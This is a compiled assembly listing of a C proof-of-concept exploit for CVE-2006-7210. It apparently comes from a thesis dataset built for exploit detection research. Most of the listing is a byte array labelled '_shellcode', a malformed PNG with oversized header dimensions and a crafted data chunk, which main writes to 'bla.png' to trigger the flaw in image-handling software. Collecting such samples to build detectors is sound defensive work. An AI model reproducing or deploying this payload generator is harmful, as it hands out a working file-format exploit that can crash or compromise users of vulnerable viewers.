; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_2210_cve_id_CVE-2006-7210.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	_shellcode
_DATA	SEGMENT
_shellcode DB	089H, 'PNG', 0dH, 0aH, 01aH, 0aH, 00H, 00H, 00H, 0dH, 'IH'
	DB	'DR', 00H, 00H, 0ffH, 0ffH, 00H, 00H, 0ffH, 0ffH, 08H, 00H, 00H
	DB	00H, 00H, 0c3H, 07H, 0f1H, '\', 00H, 00H, 00H, 07H, 'tIME', 07H
	DB	0d6H, 02H, 0eH, 0fH, '%', 012H, 082H, 0baH, 097H, 'S', 00H, 00H
	DB	00H, 09H, 'pHYs', 00H, 00H, 0aH, 0f0H, 00H, 00H, 0aH, 0f0H, 01H
	DB	'B', 0acH, '4', 098H, 00H, 00H, 00H, 04H, 'gAMA', 00H, 00H, 0b1H
	DB	08fH, 0bH, 0fcH, 'a', 05H, 00H, 00H, 09H, 'MIDATx', 0daH, 0cdH
	DB	09dH, 'Al', 01bH, 'E', 014H, '@''', 0ffH, 00H, 00H, 00H, 0ffH, 00H
	DB	0ffH, 00H, 00H, 00H, 00H, 0ffH, 0ffH, 00H, 0ffH, 00H, 0ffH, 0ffH
	DB	0ffH, 0ffH, 0ffH, 0c8H, 0a8H, 0bdH, 094H, 0aH, 0c9H, '-', 01cH
	DB	' pqz', 0ffH, 0ffH, 0ffH, 0ffH, 0ffH, 0ffH, 0ffH, 0ffH, 0ffH, 0ffH
	DB	0ffH, 0ffH, 0ffH, 00H, 'M', 0eH, 'uUUJr1j9', 0d8H, 085H, 083H, '['
	DB	09H, 0d2H, 014H, 'U', 0c8H, '+', 0a1H, '&', 015H, 'H', 0d8H, 016H
	DB	012H, 'i', 00H, 01H, '*bY', 0efH, 'z', 0d7H, '^{v', 0feH, 0ffH
	DB	'3c6', 0ffH, 014H, '{', 0ffH, 0eeH, '>', 0ffH, 099H, 0ffH, 0e7H
	DB	0cfH, 0ccH, 0dfH, 0cdH, 098H, 0cdH, 02H, 0f9H, 0e7H, 0c7H, 0dfH
	DB	0d8H, '6', 091H, 0c7H, 08cH, 09dH, 0bdH, 0fH, 0c1H, 09fH, 0f6H
	DB	0f7H, 0e5H, 0efH, 0beH, 0f9H, '=n', 0b6H, 080H, 0f1H, 0e9H, 097H
	DB	'^}"', 0f8H, 'd', 0bbH, 0f2H, 0c7H, 0d7H, 0efH, '<', 0a1H, 'p', 0c9H
	DB	011H, 0c8H, 0d8H, 0feH, 'Sw', 01eH, 'xp', 01eH, 0e3H, 0fH, 'G', 01fH
	DB	08dH, 09bH, 089H, '#', 08fH, 0bfH, 0bbH, 0d5H, 'c', 0fcH, 0e1H
	DB	085H, 0b8H, 'q', 0f8H, 0b2H, 0e3H, 0e4H, 096H, 0cfH, 0b8H, ']', 011H
	DB	'}H', 087H, 0f1H, 0efH, 0d7H, 0e3H, 'F', 011H, '@', 0ceH, '{', 08cH
	DB	0d5H, 0edH, 0d8H, 017H, '}', 0d9H, 0ffH, 's', 087H, 0f1H, 0dfH
	DB	0b7H, 0a3H, 08eH, 01bH, 099H, 0b8H, 09H, 09dH, 0d8H, 'x', 0b1H
	DB	0c3H, 'x''2', 0e8H, 'd', 0ecH, 'z6nF6u', 0dfH, 'a', 0fcH, '0', 0f2H
	DB	'p', 0c6H, 0e9H, 0bH, 08dH, 09cH, 011H, '/', 0e3H, 0aeH, 0aaH, 0cdH
	DB	0feH, 08cH, 'v', 0eaH, 08cH, 01bH, 09dH, 0e2H, 0b6H, 'e', 0c1H
	DB	'f[', 07H, '"', 08fH, '&', 0bdH, '0oW', 092H, 'q2', 0beH, 0f0H
	DB	0a7H, 088H, 0d1H, 0b4H, '})', 09aH, 0f1H, '1', 01eH, 0d8H, 'z', 08H
	DB	0a5H, '7{=?', 0aaH, 'n', 099H, ',', 0e4H, '@', 01dH, 081H, 01dH
	DB	'Y', 0d3H, 0eeH, 'Ic$', 0ddH, '2[o', 0daH, 015H, 0b1H, 0caH, 081H
	DB	'-4', 0a3H, 0d3H, '-', 0b5H, '7x', 0b6H, 0eeH, ':', 0a5H, 012H
	DB	'c#', 0c4H, 'h7', 0bH, 'Z', 01bH, '<Y', 0eeH, 0b6H, 090H, 012H
	DB	'c', 0d9H, 01eH, 090H, 0baH, 'F', 0fH, 0cfH, 0fbH, 0adH, 0d4H, 010H
	DB	0ffH, 'r', 0c0H, 'g6', 07H, 0bfH, 'H', 0ddH, '(j2', 0a5H, 'Y9', 093H
	DB	0e8H, 0feH, 0b9H, 017H, 'T', 016H, 0d9H, '1k', 0fH, 'KC', 08bH
	DB	')3}', 0ddH, 0a8H, ')', 0eeH, 0e7H, 080H, 01dH, 0efH, 0f1H, 0cH
	DB	0b0H, 092H, 'WG', 0ccH, ']%', 0f9H, 09fH, 0c8H, 08eH, 'F', 0c3H
	DB	0e6H, 'IY', 0b1H, 0bdH, 08dH, 'b', 0d8H, 015H, 095H, 0ecH, 0d8H
	DB	0aeH, 'r', 0bfH, '>', 0f1H, 095H, 'Z', 0d2H, 'vn', 096H, 0a6H, '/'
	DB	01eH, 'g', 0d6H, 0f8H, '_', 09bH, 08bH, '*', 0edH, ']>A=C', 0d4H
	DB	0d6H, 0ccH, 'h', 0daH, 011H, 'R', 091H, 'moc(', 0a0H, 0a9H, 0b5H
	DB	'5k', 0afH, 'F', 01dH, '9,', 0dbH, 0deH, 0e7H, 0c8H, 'V', 04H, 0daH
	DB	09aH, 095H, '"', 08fH, 098H, 08bH, 'p.', 0c0H, 091H, 02H, 01dH
	DB	011H, 'h', 0ebH, 0c1H, '![', 0d9H, 0bfH, 's', 09cH, 0cbH, '(', 0b6H
	DB	'5cK', 082H, 'c''V', 0a8H, 0f1H, '<', 0f3H, 081H, 084H, 015H, 'A'
	DB	';', 09aH, '"C', 0daH, 'MZ', 0a7H, 0e4H, 0c7H, '[e;Z', 0abH, 0a2H
	DB	0a3H, 089H, 0abH, 0a4H, ' T', 0e2H, 0d3H, 0fcH, 0aaH, 'hG', 096H
	DB	014H, 01aH, 0d2H, 099H, 'F', 0e0H, ';e', 09eH, 07fH, 05H, '0', 0efH
	DB	01H, 019H, 087H, 013H, '4Y', 0cfH, 089H, 0eaH, '6j', 0f9H, 0a3H
	DB	0f0H, 0d2H, 081H, 0d4H, 091H, 090H, 'u[', 092H, 011H, 09eH, 's'
	DB	'Y', 017H, 00H, 085H, 0d4H, 0aH, '*', 089H, 0c9H, 0a5H, '"', 0eH
	DB	080H, 0ddH, 011H, 0b6H, 'cT', 0f6H, 0d3H, 'o', 09H, 04H, 'd', 0f4H
	DB	'U', 0caH, 0eaH, 'vd', 0edH, '7[', 080H, 086H, 'y', 01dH, 0eH, 094H
	DB	's', 091H, 0bfH, 'c', 03H, ':', 015H, '3', 0bfH, 0beH, '9', 0fH
	DB	'i$>', 087H, ' ', 0cdH, 0b7H, '"', 0fH, 'm', 02H, 0a7H, 0a2H, 018H
	DB	0d9H, 0d9H, 'K', 090H, 086H, 0b9H, 02H, 'D', 0f3H, 0f7H, 012H, 091H
	DB	087H, '@FD', 07fH, 0ecH, 'H', 05H, 0eaH, 092H, 0c0H, 090H, 'c', 08H
	DB	0ceH, 04H, '~', 01dH, 'v-', 085H, 0cdH, 'Y', 090H, 'FbQt', 0afH
	DB	'9', 0c1H, 0b1H, '{', 0cH, 012H, 09cH, 01dH, 083H, '549K', 0aH
	DB	'C', 03H, 'pg', 0b4H, 01dH, 0d9H, 0cdH, 0e3H, 0a0H, 'J', 0e2H, 'j'
	DB	'$dZ', 010H, 09cH, 0a0H, 0a0H, 081H, 0f4H, 099H, 08eH, '\>', 05H
	DB	0ebH, ',F', 0adH, '[', 01dH, 012H, 09cH, 0b4H, 0aeH, 08fH, 091H
	DB	09dH, '=', 0fH, 0aaH, '$>', 0e6H, 087H, ' #-8', 09H, 01eH, 'f', 0f0H
	DB	08cH, 0ecH, 0e4H, 017H, '0$', 07fH, 'X', 01cH, 'O', 09H, 0ceH, 0b9H
	DB	0adH, 093H, 091H, 0cdH, 0c8H, 'B', 0eeH, 013H, 09dH, 0b2H, 0a1H
	DB	095H, 0b1H, '=s', 03H, 0d4H, '1y', 090H, 0d3H, 0a2H, '3t', 0f6H
	DB	0c7H, 0eH, 0e4H, 'Q0L2', 0b3H, '4', 09cH, 0aaH, 01dH, 014H, 09dH
	DB	00H, 087H, 'G', 012H, 0a3H, 03H, 09H, '[25', 0cH, 0f9H, 094H, '@'
	DB	0ddH, 0d2H, 0eaH, '3', 0eeH, 015H, 011H, 0cdH, '}', 0f8H, 0dcH
	DB	0e0H, '7', 0a2H, 015H, 0c6H, '_', 0dbH, 0baH, 019H, 099H, 'u', 014H
	DB	'v', 09cH, 013H, 0c5H, 0f0H, 'g#!P^c', 0a0H, 'P', 019H, 01dH, 0c7H
	DB	01H, 093H, ' 6', 01bH, '^', 0c2H, 098H, 010H, 0e9H, 'n', 08cH, 080H
	DB	091H, 0b5H, '_', 083H, 'G', 09cH, 0fH, 'B', 0a3H, 0e2H, 01eH, 091H
	DB	0eaH, 0adH, 'Q0:#', 0ceH, 0cbH, 090H, '{''', 016H, 0fbH, '#', 090H
	DB	0c8H, 08eH, '-', 0d8H, 0adH, 0a5H, 018H, 0d9H, '5', 0b0H, 'S&J'
	DB	0c8H, 'K', 0adH, 0c3H, 0d1H, 'L', 08eH, 091H, 'YGN', 01H, 0e9H
	DB	'J', 0aaH, 088H, 0bbH, 'R', 0dH, 0a1H, '#', 0c7H, 0e8H, 0b4H, '7'
	DB	'd', 0caH, '>', 0bfH, 011H, 085H, 09eH, 'e', 0ccH, 0cdH, 090H, '9'
	DB	'.Gr', 0e2H, '9m3', 0c8H, 081H, 08aH, 0d1H, 'J', 0dH, 0f8H, '6'
	DB	0f8H, 01cH, 097H, '#', 0bH, 0cfH, 0bH, 01bH, '<', 0f1H, 091H, '?'
	DB	0deH, 08H, 0ecH, 08H, 0adH, '/', 0a8H, 0daH, 091H, 'uv1D', 0bH
	DB	'-~', 097H, 08cH, '^1j"', 016H, 0fH, '0', 0ebH, '=bI', 08aH, 096H
	DB	0acH, 0baH, ']2zRYA', 0dcH, 'A', 09dH, 0d1H, 0a1H, 08cH, 'F', 0e8H
	DB	'v', 0c9H, 'h', 05H, 0ccH, 012H, 0abH, 0eH, 'F', 0c6H, '2', 091H
	DB	010H, 0deH, 0d2H, 'b', 0e4H, 'a', 08cH, 019H, '51', 0aH, '(', 0cbH
	DB	'BF', 0d4H, 'r', 0baH, '.', 0c6H, 'h', 0caH, 09cH, 080H, 011H, 017H
	DB	0e6H, 0f5H, '1:', 094H, 'e', 09eH, 08fH, 'w<7', 0c2H, 0adH, 01aH
	DB	0b8H, 0b5H, 'U', 09dH, 08cH, 08eH, 0f7H, 0f0H, '"Q%', 092H, 011H
	DB	'YD', 0a2H, 097H, 0d1H, 099H, 0ccH, 014H, 09aH, 01cH, 014H, '~'
	DB	'[#', 07H, 't', 0edH, 08cH, 'NT', 0cfH, 0fH, 08eH, 090H, 08dH, '<'
	DB	'7', 0ceH, '#[Zq,', 0e4H, '"N', 0acH, '_', 018H, 018H, ' ', 0cdH
	DB	'3', 0bcH, 0a9H, 'B', 0ebH, 'Mx', 01eH, 0e3H, 0cbH, 'N', 0b4H, '&'
	DB	'H7', 0f9H, 'dz|o', 02H, 0a9H, 0feH, 0feH, 'M', 0fcH, 0a5H, 0b5H
	DB	'0', 01aH, 093H, 0d3H, 07H, 09fH, 0c1H, 0d2H, 0b9H, 'rj', 081H
	DB	0a0H, 0acH, 0ceH, 'h', 0a6H, 0d3H, 0d3H, '$>G', 0ceH, 09fH, '%'
	DB	0a9H, '+', 0faH, 'L', 0a6H, 02H, 'm1)', 0b8H, 0b4H, '+', 08aH, '~'
	DB	'm', 0e4H, 0eaH, 't@', 0eaH, 0beH, 0b7H, 01aH, 'c', 0eH, 0dcH, '\'
	DB	'R', 0b7H, 0a2H, 01aH, 'cF', 08eH, 0b0H, 'I-i', 091H, 'g4', 08aH
	DB	'R', 084H, 'A', 0deH, 'Ka', 094H, 0f4H, 0ebH, 0e4H, 'G)', 0b9H
	DB	013H, 0d9H, 093H, 012H, 0e7H, 'H', 0d9H, '1#', 0e1H, 0ccH, 0beH
	DB	0fcH, 'Om', 09dH, 'S@', 0b4H, 09bH, 0c4H, 0a2H, 'Y9', 0c6H, 09cH
	DB	02H, 0a1H, 08dH, 09bH, 0cH, 086H, 018H, '%r', 08aH, ',', 0bcH, 09H
	DB	'"', 094H, 'D', 089H, 'X', 017H, 'D', 0f7H, 099H, 0ccH, 0c7H, 0e1H
	DB	0cfH, 0d6H, 0adH, 08dH, 0bdH, 093H, '$', 0fH, 'J', 0cdH, 09dH, 0a6H
	DB	0ddH, 092H, 0daH, 0d6H, 03H, '[', 07fH, 'M', 0efH, 'y', 086H, ','
	DB	0adH, 087H, 'R', 0caH, 082H, '$', 0faH, 'c8', 0a9H, 0eH, 0f6H, '1'
	DB	'M', 0d2H, 0a8H, 'X''', 0dcH, 090H, 0ceH, '8P', 0a3H, 0d3H, 01bH
	DB	0d7H, 010H, 01bH, 0b3H, '}B', 088H, 0e4H, 'd', 0c6H, 0c1H, 'B', 09aH
	DB	0beH, '8', 02H, 'o', 0c3H, 0f7H, 09H, 'z', 0a6H, ' ', 0e1H, 0d7H
	DB	0f3H, 03H, 099H, 'b_', 09dH, 0c1H, 'u', 0d2H, 'o=FP', 0a6H, '1'
	DB	'f', 0eH, 0fH, '|1A:', 0bdH, 'Of', 08H, 0f1H, 087H, 0c6H, 0f8H
	DB	0deH, 0d0H, 0adH, 'z', 07fH, 'N', 092H, 0aeH, 094H, 0a2H, 0a8H
	DB	'S', 0faH, 'cf', 0b8H, 'c', 05H, 0a3H, '/', 0cdH, 'g', 0c0H, 0caH
	DB	0a3H, 09eH, 010H, '}', 086H, 0b7H, 0e0H, 0d0H, '}', 0b0H, '&I', 0cdH
	DB	'&', 09bH, 0f8H, 0f9H, '5e', 09cH, '1x{', 0bcH, 'g^Y', 0aeH, 0b1H
	DB	'}', 0d3H, 0c7H, 0a8H, 0d3H, 0aeH, 0c4H, 0e4H, '5', 0acH, '*', 085H
	DB	'1', 0cdH, 0e5H, 'HIf', 092H, 0d3H, 'hF', 08aH, 0cfH, 'L', 013H
	DB	'ta', 0c1H, 'G', 01fH, 0aH, 0e3H, '>', 082H, '.,{', 0d1H, ')', 01aH
	DB	085H, 0f1H, 019H, 0adH, 08cH, 089H, 083H, 'XM', 0aH, '#', 0d5H
	DB	'-', 00H, 019H, 01fH, 05H, 0a3H, 'fI', 08fH, 082H, 011H, 0aeH, 0baH
	DB	'"', 0c9H, 01eH, 0acH, '"', 085H, 'q', 095H, 0a0H, 08bH, 090H, 'q'
	DB	'l', 014H, 0a7H, '0"', 0b6H, 0c3H, 'I', 08cH, 'XE', 0aH, 'c', 095H
	DB	0a0H, 0abH, 'S(', 08cH, '5', 0cdH, 01dH, 'r', 014H, 08cH, 'm', 0dcH
	DB	'N.V', 0e0H, 0e7H, 0aH, '%', 018H, 'Y)', 01eH, 'C', 092H, 018H
	DB	'-', 0b0H, 08H, 09bH, '"p=', 0b3H, 0cH, '#;', 0bH, 'Wr', 08dH, '@'
	DB	088H, 0e3H, 0ccH, 'L', 01cH, 0adH, 'M', 0adH, 089H, '{C', 01fH
	DB	'$', 0a2H, 01aH, 'N', 08aH, 091H, ']', 0d3H, 07H, 0b9H, 081H, 'U'
	DB	'$', 0e7H, 014H, 0d7H, 0deH, '@T6', 0a1H, 'dD>', 0e3H, 'B"', 0aaH
	DB	0bH, 'Q', 0b2H, '1:Ff', 0cdH, 09cH, 0d1H, 0d2H, 0deH, 'p!', 0aeH
	DB	'<#k', 09fH, 0d6H, 'aJL', 0c5H, 09eH, '<#c7', 08fH, 0ccH, '*', 0f7H
	DB	0caH, 0cdH, 091H, 0daH, 0b1H, '#', 0bH, 0cfH, 0cfH, '*68:', 0f4H
	DB	0c8H, 0cfH, 015H, 0daH, 0bH, 07H, 'f', 095H, 'F', 09dH, 01aH, 'Z'
	DB	'Sa>', 0d3H, '^x', 0f6H, 0e5H, 'K', 0f2H, 0c6H, 'D', 014H, 0b9H
	DB	0faH, 0a2H, 0b8H, '7l', 0e4H, 0caH, 092H, 09bH, '5', 0f8H, 0f5H
	DB	01eH, 0dH, '5', 01fH, 'FV', 06H, 013H, 'Q', 0f9H, 0a8H, 091H, 0b1H
	DB	083H, 'I', 0dfH, 0c7H, 'F', 0efH, 010H, 'k', 0abH, 'K', 0a1H, 0afH
	DB	0e7H, 012H, '&Gz', 018H, 0d3H, 0e4H, '%', 08cH, 'V', 0edH, 0ffH
	DB	'f', 0a4H, 0acH, 0c0H, '{', 0b2H, 08aH, '/', 0efH, 0d1H, 0c4H, 'x'
	DB	088H, '|F', 089H, 0a0H, 0abH, 085H, 0d1H, 'DO', 0f1H, '|9', 07fH
	DB	099H, 0a0H, 0acH, 0adH, 'N', 08aH, '"', 0d6H, 012H, 'iSsd', 08cH
	DB	'7X', 0c4H, 01aH, 0b4H, 'U]Z#t', 0c6H, 091H, '1ZK%+', 0c9H, 01bH
	DB	0cdH, 0adH, 'j', 089H, 'Ph6:', 0c6H, 'Vu', 0a9H, 0c6H, '5', 014H
	DB	0ddH, 082H, 01aH, 019H, 0adH, 0f5H, '^|l](y', 0a9H, 0e5H, 0c0H
	DB	0f2H, 0a2H, 'c', 0c1H, 'u', 019H, '@5', 0c6H, 0cH, 0bH, 0acH, 0b2H
	DB	0dcH, 0edH, '{', 0adH, 0d5H, 'R`', 0c2H, 0beH, 0a1H, 0a7H, 0b5H
	DB	0b9H, 0b4H, 'Lo', 0e2H, 09eH, 0c8H, 08fH, 0d7H, 0dH, 0bbH, 0e1H
	DB	0bfH, '=', 0ceH, '{', 0ebH, ']', 0a3H, 0e0H, 016H, 'S', 09bH, 'Y'
	DB	0f7H, 0dbH, 082H, 0bfH, 0a1H, 'U', 0c9H, '+', 0bdH, 082H, 'J)', 0a7H
	DB	0e8H, '$;>e', 0d1H, 0b6H, 0ebH, '^', 0d5H, 'B', 0a7H, 0bcH, '9'
	DB	01bH, '06', 08aH, 0caH, 0efH, 'fTa', 0ecH, '>', 09aH, 0eeH, 015H
	DB	'T', 018H, 'yw', 0b7H, 0c5H, 0f4H, 0aaH, 'q', 0ddH, 08dH, 'N3', 097H
	DB	'M', 0eH, 0f1H, 019H, 'f&_', 0acH, 0d7H, ')eq', 0caH, 'vtm', 0e5H
	DB	017H, 03H, 04H, 0b5H, 0d7H, '\', 04H, 0c3H, 0ccH, 016H, '*', 08dH
	DB	0aeH, 06H, 0a1H, 0e8H, 'C', 083H, 01dH, ';R', 0cfH, 084H, 'k!', 087H
	DB	0f6H, '}', 08dH, 'd>', 0c0H, 's', 085H, 'TO', 0a1H, '%', 0f6H, 0a4H
	DB	0aeH, 0b6H, 0d6H, '''', 0faH, 0d2H, 0b3H, 'P', 0d8H, 0e1H, 016H
	DB	0ebH, 0d6H, '(', 097H, 097H, 'g', 0cH, 05H, 0bbH, 'D', 08H, '"'
	DB	'x', 0beH, 0d5H, 098H, '<4', 0c5H, ')&n', 0cdH, 093H, 'f', 0e7H
	DB	0aH, 'v', 0b4H, '"7%', 0bdH, 03H, 0c6H, '\z', 082H, 093H, 0fbH
	DB	'Z', 0b7H, 'j5', 0daH, 02H, 0c2H, 'h', 0c6H, 'k', 0c3H, '1', 0b2H
	DB	0b1H, '2', 098H, 'T', 0b4H, '6', 0efH, 0deH, 0aeH, 0deH, 0a3H, '/'
	DB	'p(0', 0aH, 01eH, 'J', 09eH, 'p', 018H, 0c7H, 'Cs', 01cH, 0ebH
	DB	0eeH, 0edH, '[', 0b7H, 0f1H, 'K', 013H, 0baH, 018H, 0d7H, 0faH
	DB	0edH, 0d4H, 0aH, 0edH, 0caH, 0eeH, 0e9H, 0ffH, 09H, '*x', 0caH
	DB	08cH, 01H, 0dfH, 092H, 093H, 'p', 019H, 0e9H, 0b9H, 01eH, 's'''
	DB	'/oW', 0a7H, '7', 0efH, 0deH, '[[', 097H, 'Ju', 0c2H, '"', 01fH
	DB	0c3H, 0bbH, 0afH, 0a6H, 0adH, 0fbH, 0a3H, 09dH, 0d1H, '{', 0c0H
	DB	0c3H, 0abH, 0a8H, 0d1H, 0f3H, ':K', 0a5H, 'q', 0c6H, 09dH, 0f8H
	DB	0d7H, 0fbH, 'G', 08cH, 0a4H, 01fH, 0c6H, 0bH, 'Z', 0e8H, '40', 0b2H
	DB	'l', 0b3H, '<', 090H, 0d1H, 0f8H, 015H, 0d9H, ':', 019H, 08fH, '='
	DB	'`', 0fH, 0e8H, 's', 0e3H, 01eH, 0d2H, 0f0H, 'W^9', 0b1H, 'N', 0c6H
	DB	'Omf', 07fH, '6', 0a6H, 0f1H, 082H, 0ddH, 'G"52', 08eH, 07fH, 0ebH
	DB	'0', 0feH, 0b4H, '_+', 0a3H, 09bH, 'KJ', 0bdH, 0d2H, 090H, '/', 0c7H
	DB	0ffH, 0eeH, 0bcH, '+', 01eH, 0f1H, 'B', 019H, 09aH, 'd', 0b1H, 'o'
	DB	'<C', 0c8H, 0aeH, '/', 0ddH, 0f7H, 0d9H, 0dfH, 0d9H, 'f', 0ffH
	DB	0fdH, '!$S', 0f7H, ']', 0c6H, 07fH, 'O', 0efH, 088H, 09bH, '$R'
	DB	'v_', 0b1H, 0bdH, 0ffH, 0afH, 0b0H, 'ur', 0bbH, 'B', 0eeH, 0feH
	DB	0e4H, 09fH, '.', 0e3H, 0b6H, 085H, 0f4H, 010H, 0bbH, 0ffH, 0efH
	DB	'ck~', 07fH, ',', 08bH, 'SByx', 0eaH, 08aH, 08bH, 0d8H, 'e', 0b4H
	DB	0edH, 09fH, '/N', 0edH, 08aH, 01bH, '*$', 0e3H, 0c7H, 097H, 0efH
	DB	'w', 0d9H, 0c6H, 082H, 'Wwm', 0adH, 0deH, 0f8H, 0f2H, 097H, 0b8H
	DB	0c9H, '|', 0d9H, 0f7H, 0dcH, 08bH, 'O?', 0ecH, 07fH, 018H, 0ebH
	DB	07fH, 0bdH, 0d8H, '_', 0fH, 0e2H, 'f', 0f3H, 0e5H, 091H, 0feH, 0aeH
	DB	0f7H, 01fH, ':S', 0b1H, 09H, 0ddH, 0afH, 0eH, 0baH, 00H, 00H, 00H
	DB	00H, 'IEND', 0aeH, 'B`', 082H, 00H, 00H
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_printf
PUBLIC	_main
EXTRN	_exit:PROC
EXTRN	___acrt_iob_func:PROC
EXTRN	_fclose:PROC
EXTRN	_fopen:PROC
EXTRN	_fputc:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	_getch:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98732 DB	'wb', 00H
	ORG $+1
$SG98733 DB	'bla.png', 00H
$SG98734 DB	'bla.png', 00H
$SG98735 DB	'Unable to create file %s', 00H
	ORG $+3
$SG98736 DB	'Creating PNG file', 0aH, 00H
	ORG $+1
$SG98737 DB	'bla.png', 00H
$SG98738 DB	'PNG file %s successfully created..', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_File$ = -8						; size = 4
_i$ = -4						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\prescelte\permutations\exp_db_2210_cve_id_CVE-2006-7210.c
; Line 178
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 182
	mov	DWORD PTR _i$[ebp], 0
; Line 184
	push	OFFSET $SG98732
	push	OFFSET $SG98733
	call	_fopen
	add	esp, 8
	mov	DWORD PTR _File$[ebp], eax
	cmp	DWORD PTR _File$[ebp], 0
	jne	SHORT $LN5@main
; Line 185
	push	OFFSET $SG98734
	push	OFFSET $SG98735
	call	_printf
	add	esp, 8
; Line 186
	call	_getch
; Line 187
	push	0
	call	_exit
$LN5@main:
; Line 190
	push	OFFSET $SG98736
	call	_printf
	add	esp, 4
; Line 192
	mov	DWORD PTR _i$[ebp], 0
	jmp	SHORT $LN4@main
$LN2@main:
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN4@main:
	cmp	DWORD PTR _i$[ebp], 2495		; 000009bfH
	jae	SHORT $LN3@main
; Line 193
	mov	ecx, DWORD PTR _File$[ebp]
	push	ecx
	mov	edx, DWORD PTR _i$[ebp]
	movsx	eax, BYTE PTR _shellcode[edx]
	push	eax
	call	_fputc
	add	esp, 8
	jmp	SHORT $LN2@main
$LN3@main:
; Line 195
	mov	ecx, DWORD PTR _File$[ebp]
	push	ecx
	call	_fclose
	add	esp, 4
; Line 196
	push	OFFSET $SG98737
	push	OFFSET $SG98738
	call	_printf
	add	esp, 8
; Line 197
	call	_getch
; Line 199
	xor	eax, eax
$LN6@main:
; Line 200
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
